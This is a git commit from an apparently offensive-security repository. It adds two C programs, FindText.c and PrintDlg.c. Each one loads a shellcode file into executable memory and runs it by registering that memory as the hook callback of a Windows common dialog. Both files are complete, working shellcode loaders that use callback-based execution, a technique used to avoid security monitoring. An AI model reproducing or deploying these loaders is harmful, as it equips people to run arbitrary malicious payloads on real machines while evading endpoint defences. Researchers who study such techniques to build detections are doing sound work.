e999491ad2bed20a4ff8e7967e303368fea2da5c
Wra7h <60988551+Wra7h@users.noreply.github.com>
2022-09-12 22:27:34 -0700

    5 New Methods [Sept 12]

---
+++ C/FindText.c
@@ -0,0 +1,67 @@
+// Wra7h/FlavorTown
+// Written/Compiled: Visual Studio 2022
+// Usage: this.exe <shellcode file>
+#pragma comment(lib, "Comdlg32.lib")
+
+#include <stdio.h>
+#include <windows.h>
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);
+
+INT wmain(INT argc, WCHAR* argv[])
+{
+	BOOL Ret = FALSE;
+	DWORD SCLen = 0;
+	PCHAR Shellcode = NULL;
+
+	if (argc != 2)
+	{
+		printf("Usage: FindText.exe C:\\Path\\To\\Shellcode.bin");
+		goto CLEANUP;
+	}
+
+	//Read shellcode and setup
+	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
+	if (!Ret)
+		goto CLEANUP;
+
+	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
+		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	memcpy(hAlloc, Shellcode, SCLen);
+
+	FINDREPLACE sFindReplace = { 0 };
+	sFindReplace.lStructSize = sizeof(FINDREPLACE);
+	sFindReplace.hwndOwner = GetForegroundWindow();
+	sFindReplace.Flags = FR_ENABLEHOOK;
+	sFindReplace.lpstrFindWhat = L"h7arW";
+	sFindReplace.lpstrReplaceWith = L"Wra7h";
+	sFindReplace.wFindWhatLen = 1;
+	sFindReplace.wReplaceWithLen = 1;
+	sFindReplace.lpfnHook = (LPFRHOOKPROC)hAlloc;
+
+	FindText(&sFindReplace);
+
+CLEANUP:
+	if (Shellcode)
+		free(Shellcode);
+
+	return 0;
+}
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
+{
+	FILE* f = NULL;
+	_wfopen_s(&f, Filepath, L"rb");
+	if (f)
+	{
+		fseek(f, 0, SEEK_END);
+		*BufferSize = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		*Buffer = malloc(*BufferSize);
+		fread(*Buffer, *BufferSize, 1, f);
+		fclose(f);
+	}
+
+	return (*BufferSize != 0) ? TRUE : FALSE;
+}
---
+++ C/PrintDlg.c
@@ -0,0 +1,62 @@
+// Wra7h/FlavorTown
+// Written/Compiled: Visual Studio 2022
+// Usage: this.exe <shellcode file>
+#pragma comment(lib, "Comdlg32.lib")
+
+#include <stdio.h>
+#include <windows.h>
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);
+
+INT wmain(INT argc, WCHAR* argv[])
+{
+	BOOL Ret = FALSE;
+	DWORD SCLen = 0;
+	PCHAR Shellcode = NULL;
+
+	if (argc != 2)
+	{
+		printf("Usage: PrintDlg.exe C:\\Path\\To\\Shellcode.bin");
+		goto CLEANUP;
+	}
+
+	//Read shellcode and setup
+	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
+	if (!Ret)
+		goto CLEANUP;
+
+	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
+		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	memcpy(hAlloc, Shellcode, SCLen);
+
+	PRINTDLG sPrintDlg = { 0 };
+	sPrintDlg.lStructSize = sizeof(PRINTDLG);
+	sPrintDlg.Flags = PD_ENABLEPRINTHOOK;
+	sPrintDlg.lpfnPrintHook = (LPPRINTHOOKPROC)hAlloc;
+
+	PrintDlg(&sPrintDlg);
+
+CLEANUP:
+	if (Shellcode)
+		free(Shellcode);
+
+	return 0;
+}
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
+{
+	FILE* f = NULL;
+	_wfopen_s(&f, Filepath, L"rb");
+	if (f)
+	{
+		fseek(f, 0, SEEK_END);
+		*BufferSize = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		*Buffer = malloc(*BufferSize);
+		fread(*Buffer, *BufferSize, 1, f);
+		fclose(f);
+	}
+
+	return (*BufferSize != 0) ? TRUE : FALSE;
+}
